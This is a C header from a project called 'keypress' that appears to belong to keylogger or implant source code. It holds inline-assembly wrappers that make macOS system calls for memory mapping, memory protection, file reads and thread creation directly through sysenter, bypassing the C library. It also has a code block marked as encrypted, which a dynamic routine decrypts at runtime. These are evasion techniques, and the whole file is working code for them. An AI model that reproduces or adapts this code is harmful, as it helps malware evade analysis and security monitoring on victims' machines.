//
//  syscall.h
//  keypress
//
//  Created by armored on 28/03/14.
//  Copyright (c) 2014 -. All rights reserved.
//

#ifndef keypress_syscall_h
#define keypress_syscall_h

#include "dynamic_enc.h"

void dmh_mmap_end();
void dmh_mmap_enc_1();

void* _dmh_mmap(void *addr, size_t len, int prot, int flags, int filedes, int offset)
{
  void* dmh_mmap_end_ptr = dmh_mmap_end;
  
  dynamic_enc_t dyn_enc = (void*)DYNAMIC_ENC;
  
  /////////////////////////////////
  // decryptin code block
  /////////////////////////////////
  __asm __volatile__
  (
    "call   dmh_mmap_enc_1\n"
   "dmh_mmap_enc_1:\n"
    "movl   %0, %%eax\n"
    "push   %%eax\n"
    "call   %1\n"
    "test   %%eax, %%eax\n"
   : 
   : "m" (dmh_mmap_end_ptr), "m" (dyn_enc)
   : "ebx", "eax"
   );
  
  /////////////////////////////////
  // Encrypted code block: begin
  /////////////////////////////////
  void* ret_val = 0;
  
  __asm __volatile__
  (
   "push  %6\n"
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC5\n"
   "movl  $0xC5, %%eax\n"
   "call  sys_dmmap\n"
   "jmp   dmmap_exit\n"
   "sys_dmmap:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "dmmap_exit:"
   "add   $0x1C, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot), "m" (flags), "m" (filedes), "m" (offset)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
  /////////////////////////////////
  // Encrypted code block: end
  /////////////////////////////////
}

void dmh_mmap_end()
{
}

int mh_bsdthread_create(void *addr, void* arg, int stack_size, int arg1, int arg2)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x140168\n"
   "movl  $0x140168, %%eax\n"
   "call  sys_thd\n"
   "jmp   thd_exit\n"
   "sys_thd:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "thd_exit:"
   "add   $0x18, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (arg), "m" (stack_size), "m" (arg1), "m" (arg2)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

int mh_exit(int oflag)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %1\n"
   "push  $0x01\n"
   "movl  $0x01, %%eax\n"
   "movl  %%esp, %%ecx\n"
   "sysenter\n"
   "addl  $0x8, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "r" (oflag)
   : "eax", "ecx"
   );
  
  return ret_val;
}

long long mh_lseek(int fildes, long long offxet, int whence)
{
  long long _val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC7\n"
   "movl  $0xC7, %%eax\n"
   "call  sysc_lseek\n"
   "jmp   lseek_exit\n"
   "sysc_lseek:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "lseek_exit:"
   "addl  $0x10, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (_val)
   : "m" (fildes), "m" (offxet), "m" (whence)
   : "eax", "ecx"
   );
  
  return _val;
}

int mh_open(const char *path, int oflag)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %2\n"
   "push  %1\n"
   "push  $0x5\n"
   "movl  $0x5, %%eax\n"
   "call  sysc_open\n"
   "jmp   open_exit\n"
   "sysc_open:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "open_exit:"
   "addl  $0xC, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (path), "m" (oflag)
   : "eax", "ecx", "edx", "esp"
   );
  
  return ret_val;
}

ssize_t __mh_read(int fildes, void *buf, size_t nbyte)
{
  ssize_t ret_val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x3\n"
   "movl  $0x3, %%eax\n"
   "call  sys_read\n"
   "jmp   read_exit\n"
   "sys_read:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "read_exit:"
   "addl  $0x10, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (fildes), "m" (buf), "m" (nbyte)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

void* mh_mmap(void *addr, size_t len, int prot, int flagx, int filedes, int offxet)
{
  void* ret_val = 0;
  
  __asm __volatile__
  (
   "push  %6\n"
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC5\n"
   "movl  $0xC5, %%eax\n"
   "call  sys_mmap\n"
   "jmp   mmap_exit\n"
   "sys_mmap:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "mmap_exit:"
   "add   $0x1C, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot), "m" (flagx), "m" (filedes), "m" (offxet)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

int mh_mprotect(void *addr, size_t len, int prot)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x4a\n"
   "mov   $0x4a, %%eax\n"
   "call  sys_prot\n"
   "jmp   prot_exit\n"
   "sys_prot:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "prot_exit:"
   "add   $0x10, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

#endif
